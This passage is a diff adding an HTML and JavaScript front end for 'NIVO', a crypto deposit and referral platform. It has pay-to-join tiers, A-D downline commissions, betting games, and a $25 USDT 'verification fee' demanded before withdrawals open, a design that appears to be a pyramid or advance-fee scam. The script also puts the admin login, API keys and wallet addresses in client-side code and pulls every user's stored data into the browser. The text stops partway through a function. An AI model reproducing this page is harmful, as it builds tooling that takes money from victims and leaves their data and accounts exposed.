@@ -1,1 +1,1472 @@
+<!DOCTYPE html> 
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>NIVO — One spin. Real desk.</title>
+<script src="https://cdn.tailwindcss.com"></script>
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+<script>tailwind.config={theme:{extend:{colors:{ink:"#071428",blue:"#1a73e8",sky:"#eaf2ff"}}}}</script>
+<style>
+@import url("https://fonts.googleapis.com/css2?family=Manrope:wght@500;600;700;800&family=Cormorant+Garamond:wght@600;700&display=swap");
+*{box-sizing:border-box}
+body{font-family:Manrope,system-ui;background:#eef3f9;color:#071428}
+.serif{font-family:"Cormorant Garamond",serif}
+.card{background:rgba(255,255,255,.88);backdrop-filter:blur(16px);border:1px solid rgba(255,255,255,.75);border-radius:22px;box-shadow:0 16px 44px rgba(15,40,90,.10)}
+.btn{background:linear-gradient(180deg,#3b82f6,#1d4ed8);color:#fff;border-radius:14px;font-weight:800;box-shadow:0 10px 22px rgba(37,99,235,.32)}
+.ghost{border:1px solid #d5e2f2;background:#fff}
+.hidden{display:none!important}
+.side-btn{display:flex;align-items:center;gap:10px;padding:12px 14px;border-radius:14px;width:100%;font-weight:700;color:#3d4f66}
+.side-btn.on{background:#e8f1ff;color:#1557c7}
+.side-btn.gz{background:transparent;color:#1a73e8;font-weight:800;border:none;box-shadow:none;animation:none;}
+.hero{background:linear-gradient(135deg,#3b6fd4,#7eb0ff);box-shadow:0 12px 28px rgba(37,99,235,.22)}
+.hero,.hero .serif,.hero *{color:#fff!important}
+.hero img{display:none}
+.logo{width:44px;height:44px}
+.wheel{width:270px;height:270px;border-radius:50%;border:12px solid #1d4ed8;box-shadow:0 12px 32px rgba(29,78,216,.28),inset 0 0 0 6px #dbeafe;margin:0 auto;position:relative;overflow:hidden}
+.wheel{width:270px;height:270px;border-radius:50%;border:12px solid #1d4ed8;box-shadow:0 12px 32px rgba(29,78,216,.28),inset 0 0 0 6px #dbeafe;margin:0 auto;position:relative;overflow:hidden}
+.card-tile{height:92px;border-radius:16px;background:linear-gradient(180deg,#1a73e8,#071428);color:#fff;font-weight:800;font-size:22px}
+input{border:1px solid #d5e2f2;border-radius:12px;padding:12px 14px;width:100%;background:#fff}
+.lvl{display:grid;grid-template-columns:repeat(4,1fr);gap:8px}
+.lvl b{display:block;font-size:20px}
+  .lvl .card{border-radius:18px;box-shadow:0 8px 24px rgba(30,64,175,.08);border:1px solid #e8eef8}
+.lvl .card b{font-size:22px}
+  .spin-dot{width:36px;height:36px;border:3px solid #d5e2f2;border-top-color:#1a73e8;border-radius:50%;animation:sp .7s linear infinite;margin:0 auto 10px}
+@keyframes sp{to{transform:rotate(360deg)}}
+.live-strip{display:none}
+.live-chip{flex:0 0 auto;background:#fff;border:1px solid #d7e3f4;border-radius:999px;padding:8px 14px;font-size:12px;font-weight:700;animation:mar 8s linear infinite}
+@keyframes mar{0%{transform:translateX(40px)}100%{transform:translateX(-40px)}}
+.pulse-dot{width:8px;height:8px;border-radius:50%;background:#22c55e;display:inline-block;margin-right:6px;animation:pul 1.2s ease infinite}
+@keyframes pul{50%{opacity:.3;transform:scale(.8)}}
+  .gz-lights{display:flex;gap:6px;margin:8px 0 12px;justify-content:center}
+.gz-dot{width:10px;height:10px;border-radius:50%;background:#1a73e8;animation:winlight 1s linear infinite}
+.gz-dot:nth-child(2){animation-delay:.15s}.gz-dot:nth-child(3){animation-delay:.3s}.gz-dot:nth-child(4){animation-delay:.45s}.gz-dot:nth-child(5){animation-delay:.6s}
+@keyframes winlight{0%,100%{opacity:.25;transform:scale(.8)}50%{opacity:1;transform:scale(1.25)}}
+#tab-game .card{animation:gzpop .45s ease}
+@keyframes gzpop{from{transform:scale(.96);opacity:0}to{transform:none;opacity:1}}
+  #auth{min-height:100vh}
+input:focus{outline:none;border-color:#2563eb;box-shadow:0 0 0 4px rgba(37,99,235,.15)}
+.side-btn.on{box-shadow:inset 0 0 0 1px #bfdbfe}
+  .pointer{width:0;height:0;border-left:12px solid transparent;border-right:12px solid transparent;border-top:18px solid #1d4ed8;margin:0 auto 6px;position:relative;z-index:2}
+  #auth{
+  min-height:100vh;
+  background:radial-gradient(circle at 50% 0%,#1e3a8a 0%,#0b1b3a 42%,#071428 100%)!important;
+  color:#fff;
+}
+#auth .serif{color:#fff}
+#auth .text-blue,#auth .text-blue-700{color:#bfdbfe!important}
+#auth .card{
+  background:rgba(255,255,255,.08);
+  border:1px solid rgba(255,255,255,.16);
+  box-shadow:0 20px 50px rgba(0,0,0,.28);
+  color:#fff;
+}
+#auth input{
+  background:rgba(255,255,255,.08);
+  border:1px solid rgba(255,255,255,.16);
+  color:#fff;
+}
+#auth input::placeholder{color:#93c5fd}
+#auth .logo{width:72px;height:72px}
+  #auth span.rounded-full{
+  background:rgba(255,255,255,.12)!important;
+  border:1px solid rgba(255,255,255,.2)!important;
+  color:#fff!important;
+}
+  #app{background:#0b1b3a;color:#fff;min-height:100vh}
+#app .card{
+  background:rgba(255,255,255,.08);
+  border:1px solid rgba(255,255,255,.14);
+  color:#fff;
+  box-shadow:0 16px 40px rgba(0,0,0,.22);
+}
+#app .side-btn{color:#dbeafe}
+#app .side-btn.on{background:rgba(255,255,255,.12);color:#fff}
+#app .text-slate-500,#app .text-slate-600{color:#93c5fd!important}
+#app .text-slate-900{color:#fff!important}
+  #app input,#app textarea{
+  background:#0f2748!important;
+  color:#fff!important;
+  border:1px solid rgba(255,255,255,.16)!important;
+}
+#app input::placeholder{color:#93c5fd!important}
+#app .ghost,#app button.ghost{
+  background:rgba(255,255,255,.1)!important;
+  color:#fff!important;
+  border:1px solid rgba(255,255,255,.2)!important;
+}
+#tab-income .card,#tab-income .card *{color:#fff!important}
+#tab-income .card{background:rgba(255,255,255,.08)!important}
+#app #w-free,#app .text-blue{color:#7dd3fc!important}
+#dep-addr{
+  background:#0f2748!important;
+  color:#fff!important;
+}
+  #tab-volume .card,#tab-volume .card *{color:#fff!important}
+#tab-volume .card{background:rgba(255,255,255,.08)!important;border:1px solid rgba(255,255,255,.14)!important}
+</style>
+</head>
+<body>
+<svg width="0" height="0">
+  <symbol id="nivo-mark" viewBox="0 0 64 64">
+    <defs>
+      <linearGradient id="g" x1="0" y1="0" x2="1" y2="1">
+        <stop offset="0" stop-color="#60a5fa"/>
+        <stop offset="1" stop-color="#1a73e8"/>
+      </linearGradient>
+    </defs>
+    <rect rx="16" width="64" height="64" fill="#071428"/>
+    <path d="M18 46V18h8l12 18V18h8v28h-8L26 28v18H18z" fill="url(#g)"/>
+    <rect x="20" y="50" width="24" height="2" rx="1" fill="#f3d187"/>
+  </symbol>
+</svg>
+</svg>
+<div id="auth" class="max-w-md mx-auto px-4 py-10">
+  <div class="text-center mb-7">
+<svg class="logo mx-auto mb-3" onclick="adTap()"><use href="#nivo-mark"/>
+    <div class="serif text-5xl">NIVO</div>
+    <div class="text-[11px] tracking-[.35em] text-blue mt-1">ONE SPIN · REAL DESK</div>
+  </div>
+  <div class="flex justify-center gap-2 flex-wrap mb-6">
+  <span class="text-[11px] font-bold px-3 py-2 rounded-full bg-white border border-blue-100">$45 start</span>
+  <span class="text-[11px] font-bold px-3 py-2 rounded-full bg-white border border-blue-100">Daily spin</span>
+  <span class="text-[11px] font-bold px-3 py-2 rounded-full bg-white border border-blue-100">Team L2+</span>
+</div>
+  <div id="box-login" class="card p-5 mb-3">
+ 
+    <div class="font-bold mb-3">Sign in</div>
+    <input id="li-user" class="mb-2" placeholder="Username"/>
+<div style="position:relative">
+<input id="li-pass" type="password" class="mb-2 w-full" style="padding-right:42px" placeholder="Password"/>
+<button type="button" onclick="togPw('li-pass',this)" style="position:absolute;right:8px;top:50%;transform:translateY(-50%);z-index:5;background:none;border:0;padding:8px">
+<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#334155" stroke-width="2"><path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7S1 12 1 12z"/><circle cx="12" cy="12" r="3"/></svg>
+</button>
+</div>
+    <button class="btn w-full py-3" onclick="doLogin()">Continue</button>
+    <button class="w-full mt-3 text-sm text-blue" onclick="showBox('box-signup')">Create account with OTP</button>
+  <button class="w-full mt-2 text-sm text-blue-700" onclick="showBox('box-forgot')">Forgot password</button>
+  </div>
+  <div id="box-signup" class="card p-5 mb-3 hidden">
+    <div class="font-bold mb-3">Create ID · Email OTP</div>
+    <input id="su-user" class="mb-2" placeholder="Username"/>
+    <input id="su-email" class="mb-2" placeholder="Email"/>
+    <input id="su-phone" class="mb-2" placeholder="Phone number" type="tel"/>
+ <div style="position:relative">
+<input id="su-pass" type="password" class="mb-2 w-full" placeholder="Password"/>
+<button type="button" onclick="togPw('su-pass',this)" style="position:absolute;right:8px;top:50%;transform:translateY(-50%);z-index:5;background:none;border:0;padding:8px">
+<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#334155" stroke-width="2"><path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7S1 12 1 12z"/><circle cx="12" cy="12" r="3"/></svg>
+</button>
+</div>
+    <input id="su-ref" class="mb-3" placeholder="Referral code (optional)"/>
+    <button class="btn w-full py-3" onclick="sendOtp()">Send OTP</button>
+<button class="w-full mt-3 text-sm text-blue" onclick="showBox('box-login')">Log in</button>
+  </div>
+  <script>
+(function(){
+  var r=(new URLSearchParams(location.search).get("ref")||"").trim();
+  if(!r)return;
+  localStorage.setItem("nivo_ref",r);
+  var a=document.getElementById("box-login");
+  var b=document.getElementById("box-signup");
+  var c=document.getElementById("su-ref");
+  if(a)a.classList.add("hidden");
+  if(b)b.classList.remove("hidden");
+  if(c)c.value=r;
+})();
+</script>
+  <div id="box-forgot" class="card p-5 mb-3 hidden">
+  <div class="font-bold mb-3">Forgot password</div>
+  <input id="fg-user" class="mb-2" placeholder="Username"/>
+  <input id="fg-email" class="mb-2" placeholder="Email"/>
+  <button class="btn w-full py-3" onclick="sendFg()">Send OTP</button>
+  <div id="fg-step2" class="hidden mt-3">
+    <input id="fg-otp" class="mb-2" placeholder="OTP"/>
+    <input id="fg-pass" type="password" class="mb-2" placeholder="New password"/>
+    <button class="btn w-full py-3" onclick="okFg()">Reset password</button>
+  </div>
+  <button class="w-full mt-3 text-sm text-blue-700" onclick="showBox('box-login')">Back</button>
+</div>
+  <div id="box-otp" class="card p-5 mb-3 hidden">
+    <div class="font-bold mb-3">Enter OTP</div>
+    <p class="text-xs text-slate-500 mb-3" id="otp-hint"></p>
+    <input id="su-otp" class="mb-3" placeholder="6-digit code"/>
+    <button class="btn w-full py-3" onclick="verifyOtp()">Verify & open ID</button>
+    <button class="w-full mt-3 text-sm text-blue" onclick="sendOtp()">Resend OTP</button>
+  </div>
+  <div id="box-admin" class="card p-5 mb-3 hidden">
+    <div class="font-bold mb-3">Admin desk</div>
+    <input id="ad-user" class="mb-2" placeholder="Admin ID"/>
+    <input id="ad-pass" type="password" class="mb-3" placeholder="Admin password"/>
+    <button class="btn w-full py-3" onclick="adminLogin()">Enter</button>
+    <button class="w-full mt-3 text-sm text-blue" onclick="showBox('box-login')">Back</button>
+  </div>
+</div>
+<div id="app" class="hidden">
+  <div class="max-w-6xl mx-auto md:flex min-h-screen">
+    <aside class="md:w-64 p-4">
+      <div class="flex items-center gap-3 mb-6">
+  <svg class="logo"><use href="#nivo-mark"/></svg>
+        <div><div class="serif text-3xl leading-none">NIVO</div><div class="text-[10px] tracking-[.28em] text-blue">REAL DESK</div></div>
+      </div>
+      <button class="side-btn on" data-tab="home" onclick="tab('home')">Home</button>
+      <button class="side-btn" data-tab="wallet" onclick="tab('wallet')">Wallet</button>
+      <button class="side-btn" data-tab="income" onclick="tab('income')">Income</button>
+      <button class="side-btn" data-tab="volume" onclick="tab('volume')">Volume Bonus</button>
+      <button class="side-btn" data-tab="deposit" onclick="tab('deposit')">Deposit</button>
+      <button class="side-btn" data-tab="withdraw" onclick="tab('withdraw')">Withdraw</button>
+      <button class="side-btn" data-tab="spin" onclick="tab('spin')">Daily Spin</button>
+<button class="side-btn gz" data-tab="game" onclick="tab('game')">Gamezone</button>
+      <button class="side-btn" data-tab="team" onclick="tab('team')">Team A B C D</button>
+      <button class="side-btn" data-tab="profile" onclick="tab('profile')">Profile</button>
+      <button class="side-btn" data-tab="support" onclick="tab('support')">Support</button>
+      <button class="side-btn mt-6 text-slate-400" onclick="logout()">Logout</button>
+    </aside>
+    <main class="flex-1 p-4 pb-16">
+      <section id="tab-home">
+        <div class="card p-4 mb-3" style="background:linear-gradient(180deg,#071428,#12315f);color:#fff;border:1px solid rgba(212,175,55,.45)"><div style="font-size:11px;letter-spacing:.28em;color:#d4af37">NIVO REAL DESK</div><div class="serif" style="font-size:28px;margin-top:4px">Direct rewards</div><div style="font-size:13px;line-height:1.6;margin-top:8px;color:#dbe7ff">$45 joining · 10% direct<br>$100 joining · $18 reward<br>$200 joining · $35 reward</div></div>
+        <div class="hero p-6 mb-4 min-h-[168px]">
+          <div class="relative z-10">
+            <div class="text-[11px] tracking-[.3em] text-blue-200">WELCOME TO THE DESK</div>
+            <div class="live-strip">
+  <div class="live-chip"><span class="pulse-dot"></span>Live desk</div>
+  <div class="live-chip">Daily spin open</div>
+  <div class="live-chip">Gamezone 1.5x</div>
+  <div class="live-chip">Team A B C D</div>
+</div>
+            <div class="serif text-4xl mt-1">Hello, <span id="h-name">Member</span></div>
+            <div class="text-sm text-blue-100 mt-1">Level <span id="h-lv">0</span> · <span id="h-lvn"></span></div>
+          </div>
+          <img alt="" src="https://images.unsplash.com/photo-1639762681485-074b7f938ba0?auto=format&fit=crop&w=600&q=60"/>
+        </div>
+        <div class="grid grid-cols-2 gap-3 mb-4">
+          <div class="card p-4"><div class="text-[11px] tracking-widest text-slate-500">WALLET</div><div class="text-2xl font-extrabold">$<span id="h-bal">0.00</span></div></div>
+          <div class="card p-4"><div class="text-[11px] tracking-widest text-slate-500">INCOME</div><div class="text-2xl font-extrabold text-blue">$<span id="h-profit">0.00</span></div></div>
+        </div>
+        <div id="slab-home" class="card p-4 mb-4"></div>
+        <div class="lvl mb-4">
+          <div class="card p-3 text-center"><span class="text-[10px] text-slate-500">A TEAM</span><b id="nA">0</b></div>
+          <div class="card p-3 text-center"><span class="text-[10px] text-slate-500">B TEAM</span><b id="nB">0</b></div>
+          <div class="card p-3 text-center"><span class="text-[10px] text-slate-500">C TEAM</span><b id="nC">0</b></div>
+          <div class="card p-3 text-center"><span class="text-[10px] text-slate-500">D TEAM</span><b id="nD">0</b></div>
+        </div>
+        <div class="card p-4 mb-4">
+          <div class="text-[11px] tracking-widest text-slate-500 mb-1">REFERRAL DESK</div>
+          <div class="flex items-center justify-between gap-2"><div class="serif text-3xl" id="h-code"></div><button class="ghost rounded-lg px-3 py-1 text-xs font-bold" onclick="copyCode()">Copy</button></div>
+          <div class="text-xs break-all mt-1 text-slate-500" id="h-link"></div>
+          <button class="btn px-4 py-2 mt-3 text-sm" onclick="copyRef()">Copy invite link</button>
+        </div>
+        <div class="grid grid-cols-2 gap-3">
+          <button class="btn py-3" onclick="tab('spin')">Open Spin</button>
+          <button class="ghost rounded-2xl py-3 font-bold" onclick="tab('deposit')">Deposit $45+</button>
+        </div>
+      </section>
+<section id="tab-income" class="hidden">
+<div class="card p-5 mb-3" style="background:linear-gradient(180deg,#eff6ff,#fff);border:1px solid #dbeafe">
+  <div class="text-xs font-bold tracking-widest text-blue-700">TODAY</div>
+  <div class="serif text-4xl mt-2" id="inc-today">0.00</div>
+  <div class="text-xs text-slate-500 mt-1">Resets every day</div>
+</div>
+  <div class="card p-5 mb-3">
+    <div class="text-xs font-bold tracking-widest text-blue-700">REWARDS</div>
+    <div class="serif text-4xl mt-2" id="inc-rew">0.00</div>
+<div class="text-xs text-slate-500 mt-1">$45: 10% · $100: $18 · $200: $35</div>
+  </div>
+  <div class="card p-5 mb-3">
+    <div class="text-xs font-bold tracking-widest text-blue-700">DIAMOND BOX</div>
+    <div class="serif text-4xl mt-2" id="inc-dia">0.00</div>
+  </div>
+  <div class="card p-5 mb-3" style="background:linear-gradient(180deg,#eff6ff,#dbeafe);border:1px solid #bfdbfe">
+  <div class="text-xs font-bold tracking-widest text-blue-700">TEAM INCOME</div>
+  <div class="serif text-4xl mt-2 text-slate-900" id="inc-team">0.00</div>
+  <div class="text-xs text-slate-500 mt-1">Level 2+ · A B C D daily %</div>
+</div>
+</section>
+      <section id="tab-volume" class="hidden">
+  <div class="hero p-5 mb-4 min-h-[120px]"><div class="serif text-3xl relative z-10">Volume Bonus</div><div class="text-blue-100 text-sm relative z-10">ABCD team business only</div></div>
+  <div class="card p-5 mb-3">
+    <div class="text-xs font-bold tracking-widest text-amber-700">NIVO VOLUME BONUS</div>
+    <div class="text-xs text-slate-500 mt-1">Only A B C D count. Business below D is not counted.</div>
+    <div class="serif text-3xl mt-2">$<span id="vol-biz">0</span></div>
+    <div class="text-xs text-slate-500">ABCD business done · bonus received $<span id="vol-got">0</span></div>
+    <div id="vol-lines" class="mt-3"></div>
+  </div>
+</section>
+      <section id="tab-wallet" class="hidden">
+        <div class="card p-5">
+          <div class="serif text-3xl mb-2">Wallet</div>
+          <div class="text-3xl font-extrabold mb-3">$<span id="w-bal">0.00</span></div>
+        <div class="text-sm text-blue">Withdrawable income $<span id="w-free">0.00</span></div>
+  
+        </div>
+      </section>
+      <section id="tab-deposit" class="hidden">
+        <div class="card p-5">
+          <div class="serif text-3xl mb-2">Deposit</div>
+          <div class="bg-sky rounded-2xl p-3 text-xs break-all font-mono" id="dep-addr"></div>
+          <button class="btn w-full py-3 mt-3" onclick="copyAddr()">Copy address</button>
+          <div id="copy-ok" class="hidden text-center text-green-600 text-sm font-bold mt-2">Copied. Address is in your clipboard.</div>
+          <input id="dep-amt" type="number" class="mt-4" placeholder="Amount (min $45)"/>
+       <label class="block text-xs mt-3 mb-1">Transaction hash (BEP20)</label>
+          <input id="dep-hash" placeholder="Paste TX hash"/>
+<button class="btn w-full py-3 mt-4" onclick="sendDep()">Submit deposit</button>
+          <p class="text-xs mt-3 text-slate-500" id="dep-note"></p>
+          <div id="dep-hist" class="text-sm mt-4"></div>
+        </div>
+      </section>
+      <section id="tab-withdraw" class="hidden">
+        <div class="card p-5 mb-3">
+          <div class="serif text-3xl mb-2">Withdraw</div>
+      <p class="text-sm text-slate-600">Income only. Pending until admin approval. Then 24 hours.</p>
+          <p class="text-xs mt-2 break-all" id="wd-saved"></p>
+          <input id="wd-addr" class="mt-3" placeholder="0x BEP20"/>
+               <div class="flex gap-2 mt-2">
+            <button class="btn flex-1 py-2 rounded-xl font-bold" onclick="saveAddr()">Save</button>
+            <button class="ghost flex-1 py-2 rounded-xl font-bold" onclick="editAddr()">Edit</button>
+          </div>
+        </div>
+                <div class="card p-5">
+          <div class="text-xs font-bold tracking-widest text-slate-500">WITHDRAW</div>
+          <input id="wd-amt" type="number" placeholder="Amount (profit only)" class="mt-3"/>
+          <div class="flex gap-2 mt-3">
+            <input id="wd-otp" placeholder="6-digit email OTP" class="flex-1"/>
+            <button type="button" class="ghost px-3 rounded-xl font-bold whitespace-nowrap" onclick="sendWdOtp()">Send OTP</button>
+          </div>
+          <p class="text-xs text-slate-500 mt-2">OTP 5 min. Package $45 stays locked.</p>
+          <button class="btn w-full py-3 mt-3" onclick="askWd()">Request withdraw</button>
+          <div id="wd-hist" class="text-sm mt-4"></div>
+        </div>
+        </div>
+      </section>
+      <section id="tab-spin" class="hidden">
+        <div class="card p-5 text-center">
+          <div class="serif text-3xl">Daily Spin</div>
+          <div class="text-sm text-slate-500 mb-2">Spins left: <b id="sp-left">0</b></div>
+          <div id="sp-res" class="font-bold mt-2 text-sm min-h-[24px]"></div>
+    <div id="sp-next" class="text-base font-bold text-blue-700 my-2">—</div>
+          <div class="pointer"></div>
+          <div id="wheel" class="wheel"></div>
+          <button class="btn px-10 py-3 mt-5" onclick="doSpin()">Spin</button>
+        </div>
+      </section>
+      <section id="tab-game" class="hidden">
+   <div class="card p-5 text-center">
+  <div class="serif text-3xl">Nivo Flip</div>
+<div id="nf-ring" class="mx-auto my-5" style="width:110px;height:110px;border-radius:50%;border:10px solid #e8b84a;background:radial-gradient(circle at 35% 30%,#fff7d6,#f5a623 45%,#b45309);box-shadow:0 10px 28px rgba(180,83,9,.35),inset 0 -8px 16px rgba(0,0,0,.2)"></div>
+  <div class="text-3xl font-bold" id="nf-mult">1.00x</div>
+  <div class="text-sm text-slate-500 mb-3" id="nf-profit">Profit $0.00</div>
+  <div id="nf-hist" class="flex gap-1 justify-center mb-3"></div>
+  <input id="nf-amt" type="number" min="5" placeholder="Bet amount" class="w-full rounded-2xl px-4 py-3 bg-slate-100 mb-3">
+  <button type="button" class="btn w-full py-3 mb-2" id="nf-bet" onclick="nfBet()">Place bet</button>
+  <button type="button" id="nf-cash" onclick="nfCash()" class="btn w-full py-3 mb-2 hidden">Cash out</button>
+  <div class="grid grid-cols-2 gap-2">
+    <button type="button" class="btn py-3" onclick="nfFlip('H')">Heads</button>
+    <button type="button" class="btn py-3" onclick="nfFlip('T')">Tails</button>
+  </div>
+  <div class="text-xs text-slate-400 mt-2">Bet first · then Heads / Tails · 1.90x</div>
+</div>
+  <div class="card p-5 mt-4">
+        <div class="card p-5">
+      <div class="serif text-3xl">Diamond Box</div>
+          <div class="gz-lights"><span class="gz-dot"></span><span class="gz-dot"></span><span class="gz-dot"></span><span class="gz-dot"></span><span class="gz-dot"></span></div>
+<div class="text-xs tracking-widest text-center text-blue-600 mb-2">WINNER DESK</div>
+                  <div class="flex gap-2 mt-3"><input id="gz-amt" type="number" min="10" placeholder="Min $10" class="flex-1 rounded-2xl px-4 py-2 bg-slate-100"><button type="button" class="btn px-5" onclick="gzStart()">Play</button></div>
+  <div id="gz-board" class="grid grid-cols-3 gap-2 my-3">
+  <button type="button" class="btn py-3" onclick="gzPick(this)">◆</button>
+  <button type="button" class="btn py-3" onclick="gzPick(this)">◆</button>
+  <button type="button" class="btn py-3" onclick="gzPick(this)">◆</button>
+  <button type="button" class="btn py-3" onclick="gzPick(this)">◆</button>
+  <button type="button" class="btn py-3" onclick="gzPick(this)">◆</button>
+  <button type="button" class="btn py-3" onclick="gzPick(this)">◆</button>
+</div>
+          <div id="gz-msg" class="text-center font-bold mt-4"></div>
+          <p class="text-xs tracking-widest text-center text-slate-400 mt-4">MORE GAMES COMING SOON</p>
+        </div>
+    <div class="card p-4 mt-3 text-left text-sm leading-6 text-slate-600">
+  <div class="serif text-xl text-slate-900 mb-2">Game rules</div>
+  <div class="font-bold text-slate-800">Nivo Flip</div>
+  <div>1. Enter amount and tap Place bet. Stake is taken from wallet.</div>
+  <div>2. Choose Heads (yellow) or Tails (blue).</div>
+  <div>3. Win multiplies by 1.90x. Lose = stake gone.</div>
+  <div>4. Cash out anytime after a win. Flip again to raise the multiplier.</div>
+  <div>5. Minimum $5. 8 rounds per day.</div>
+  <div class="font-bold text-slate-800 mt-3">Diamond Box</div>
+  <div>1. Bet from wallet. Minimum $10.</div>
+  <div>2. Tap Play to open the box.</div>
+  <div>3. Win amount is added to wallet and income.</div>
+</div>
+      </section>
+      <section id="tab-team" class="hidden">
+        <div class="hero p-5 mb-4 min-h-[120px]"><div class="serif text-3xl relative z-10">Team structure</div><div class="text-blue-100 text-sm relative z-10">A direct · B C D downline</div></div>
+        <div id="slab-team" class="card p-3 mb-3 text-sm"></div>
+        <div class="lvl mb-4">
+          <div class="card p-3 text-center"><span class="text-[10px]">A</span><b id="tA">0</b></div>
+          <div class="card p-3 text-center"><span class="text-[10px]">B</span><b id="tB">0</b></div>
+          <div class="card p-3 text-center"><span class="text-[10px]">C</span><b id="tC">0</b></div>
+          <div class="card p-3 text-center"><span class="text-[10px]">D</span><b id="tD">0</b></div>
+        </div>
+        <div class="grid grid-cols-3 gap-3 mb-3">
+  <div class="card p-3 text-center"><span class="text-[10px] text-slate-500">TOTAL</span><b id="nTot">0</b></div>
+  <div class="card p-3 text-center"><span class="text-[10px] text-slate-500">ACTIVE</span><b id="nAct">0</b></div>
+  <div class="card p-3 text-center"><span class="text-[10px] text-slate-500">INACTIVE</span><b id="nIna">0</b></div>
+</div>
+<button class="btn w-full py-3 mb-3" onclick="showCom('A')">Community</button>
+<div id="com-box" class="card p-4 mb-3 text-sm hidden"></div>
+        <div class="card p-4 text-sm leading-7" id="t-plan"></div>
+      </section>
+      <section id="tab-profile" class="hidden"><div class="card p-5" id="p-box"></div></section>
+      <section id="tab-support" class="hidden">
+  <div class="card p-5">
+    <div class="serif text-3xl mb-3">Support</div>
+    <textarea id="sup-msg" class="mb-2" rows="4" placeholder="Write your message"></textarea>
+    <button class="btn w-full py-3" onclick="sendTicket()">Send</button>
+    <div id="sup-list" class="mt-4 text-sm leading-7"></div>
+  </div>
+</section>
+    </main>
+  </div>
+</div>
+<div id="admin" class="hidden max-w-5xl mx-auto p-4">
+  <div class="flex items-center justify-between mb-4"><div class="flex items-center gap-2"><svg class="logo"><use href="#nivo-mark"/></svg><div class="serif text-3xl">Admin</div></div><button class="ghost rounded-xl px-4 py-2" onclick="logout()">Exit</button></div>
+  <div class="grid grid-cols-2 gap-2 mb-4">
+<button class="btn py-3" onclick="adTab('vf')">Verification <span id="bd-vf" style="background:#ef4444;color:#fff;border-radius:99px;padding:0 7px;font-size:12px;display:none"></span></button>
+<button class="btn py-3" onclick="adTab('deps')">Deposits <span id="bd-deps" style="background:#ef4444;color:#fff;border-radius:99px;padding:0 7px;font-size:12px;display:none"></span></button>
+<button class="btn py-3" onclick="adTab('wds')">Withdrawals <span id="bd-wds" style="background:#ef4444;color:#fff;border-radius:99px;padding:0 7px;font-size:12px;display:none"></span></button>
+<button class="btn py-3" onclick="adTab('sup')">Support <span id="bd-sup" style="background:#ef4444;color:#fff;border-radius:99px;padding:0 7px;font-size:12px;display:none"></span></button>
+<button class="btn py-3" onclick="adTab('mem')">Members</button>
+</div>
+<button class="btn px-4 py-2 mb-3" onclick="pullCloud(function(){renderAdmin();pop('Admin','List updated')})">Refresh list</button>
+<div class="card p-4 mb-4" id="ad-vf"></div>
+<div class="card p-4 mb-4 hidden" id="ad-deps"></div>
+<div class="card p-4 mb-4 hidden" id="ad-wds"></div>
+<div class="card p-4 mb-4 hidden" id="ad-sup"></div>
+<div class="card p-4 hidden" id="ad-mem"></div>
+</div>
+<div id="pop" class="hidden fixed inset-0 bg-black/40 z-50 flex items-center justify-center p-6">
+  <div class="card p-6 max-w-sm w-full text-center">
+    <div class="serif text-3xl" id="pop-t"></div>
+    <div id="pop-spin" class="spin-dot hidden"></div>
+    <p class="text-sm mt-2" id="pop-m"></p>
+    <button class="btn w-full py-3 mt-4" onclick="closePop()">OK</button>
+  </div>
+</div>
+  <div id="verify-box" class="hidden fixed inset-0 bg-black/50 z-50 flex items-center justify-center p-4">
+  <div class="card p-5 max-w-sm w-full">
+    <div class="serif text-2xl">Account verification</div>
+    <p class="text-sm mt-2">Submit the $25 USDT BEP20 verification fee. After admin approval, spin and withdraw will start.</p>
+    <input id="vf-user" class="inp mt-3" placeholder="Username">
+    <div class="text-xs mt-3">BEP20 USDT address</div>
+    <div class="text-xs break-all font-mono">0x59552E67B1a30Ee520C8B0701dA22bf398d0D0AE</div>
+<button class="ghost rounded-lg px-3 py-1 mt-2 text-xs" onclick="copyFee(this)">Copy address</button>
+    <input id="vf-hash" class="inp mt-3" placeholder="TX hash">
+    <button class="btn w-full py-3 mt-3" onclick="submitVerify()">Submit hash</button>
+    <button class="w-full mt-2 text-sm" onclick="el('verify-box').classList.add('hidden')">Close</button>
+  </div>
+</div>
+<script>
+var ADDR="0x4E58b3522112BA59621d808E3687a566A87d7623";
+var ADMIN_ID="nivoadmin";
+var ADMIN_PW="Nivo@2026";
+var EJ_PUB="lX2os0cNyCGLrbSmQ";
+var EJ_SVC="service_62ri15t";
+var EJ_TPL="template_ynle1v9";
+var EJ_TPL_WD="template_ynle1v9";
+var ADMIN_MAIL="nivorealdesk@gmail.com";
+  var SB_URL="https://adpubgmpuyqobsvftmou.supabase.co";
+var SB_KEY="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImFkcHViZ21wdXlxb2JzdmZ0bW91Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODg3NDU2NjMsImV4cCI6MjEwNDMyMTY2M30.LsVMb0Lif65C0AtIUSXZNczuDiYEVk-M6TG9VyebEts";
+var sb=null;try{sb=supabase.createClient(SB_URL,SB_KEY)}catch(e){}
+function pushCloud(obj){
+  if(!sb||!obj||!obj.user)return;
+  sb.from("nivo_users").select("data").eq("user_name",obj.user).maybeSingle().then(function(r){
+    var c=r.data&&r.data.data;
+    if(!c){
+      sb.from("nivo_users").upsert({user_name:obj.user,data:obj,updated_at:new Date().toISOString()},{onConflict:"user_name"});
+      return;
+    }
+    var changed=false;
+    if(obj.addr&&obj.addr!==c.addr){c.addr=obj.addr;changed=true;}
+    if(obj.email&&obj.email!==c.email){c.email=obj.email;changed=true;}
+    if(obj.tickets){c.tickets=obj.tickets;changed=true;}
+    if(!changed)return;
+    sb.from("nivo_users").upsert({user_name:obj.user,data:c,updated_at:new Date().toISOString()},{onConflict:"user_name"});
+  });
+}
+    function pullCloud(done){
+  if(!sb){if(done)done();return}
+  sb.from("nivo_users").select("user_name,data").then(function(r){
+    if(r.data)r.data.forEach(function(row){
+      if(!row||!row.user_name||!row.data)return;
+      var cloud=row.data;
+      if(typeof cloud==="string")try{cloud=JSON.parse(cloud)}catch(e){return}
